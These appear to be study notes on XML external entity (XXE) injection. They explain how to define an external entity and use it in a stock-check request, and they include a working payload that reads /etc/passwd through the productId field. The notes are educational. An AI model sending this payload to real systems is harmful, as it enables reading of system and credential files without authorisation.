--- ---

<h2>Exploiting XXE to Retrieve Files</h2>

- Need to modify submitted XML in two ways
	- Introduce (or edit) a DOCTYPE element that defines an external entity containing the path to a file.
	- Edit a data value in the XML that is returned in the application's response, to make use of the defined external entity.

- Example -- shopping application checking for stock by submitting the following XML:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck><productId>381</productId><
/stockCheck>
```

- Exploit
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM
"file:///etc/passwd"> ]>
<stockCheck><productId>&xxe;</productId></st
ockCheck>
```

Define an external entity (&xxe;) whose value is the contents of /etc/passwd and uses the entity within the productId value